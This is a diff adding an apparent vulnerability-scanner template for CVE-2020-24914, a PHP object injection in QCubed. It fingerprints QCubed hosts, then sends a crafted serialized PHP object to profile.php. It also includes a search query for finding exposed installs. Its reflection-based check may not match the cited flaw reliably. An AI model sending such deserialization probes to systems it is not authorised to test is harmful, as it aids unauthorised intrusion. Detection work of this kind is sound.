@@ -1,0 +1,76 @@
+id: qcubed-php-object-injection
+
+info:
+  name: QCubed PHP Object Injection (CVE-2020-24914)
+  author: pranjal
+  severity: critical
+  description: |
+    QCubed 3.1.1 and all versions contain a PHP object injection caused by unserializing untrusted POST data in profile.php, 
+    letting unauthenticated attackers execute arbitrary code via crafted POST requests.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24914
+    - http://seclists.org/fulldisclosure/2021/Mar/28
+    - https://tech.feedyourhead.at/content/QCubed-PHP-Object-Injection-CVE-2020-24914
+    - https://www.ait.ac.at/themen/cyber-security/pentesting/security-advisories/ait-sa-20210215-01
+  classification:
+    cwe-id: CWE-502
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    max-request: 2
+    product: QCubed
+    fofa-query: title="QCubed" || body="qcubed"
+  tags: cve,cve2020,qcubed,php,object-injection,rce,kev
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200'
+          - 'contains(tolower(body), "qcubed") || contains(tolower(body), "qform")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /profile.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        data=O:8:"stdClass":1:{s:4:"test";s:10:"{{randstr}}";}&action=save&id=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "stdClass"
+          - "{{randstr}}"
+
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'contains(body, "stdClass")'
+          - 'contains(body, "{{randstr}}")'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'O:8:"stdClass":1:\{s:4:"test";s:\d+:"[^"]+";\}'
+        internal: true
+
+ 
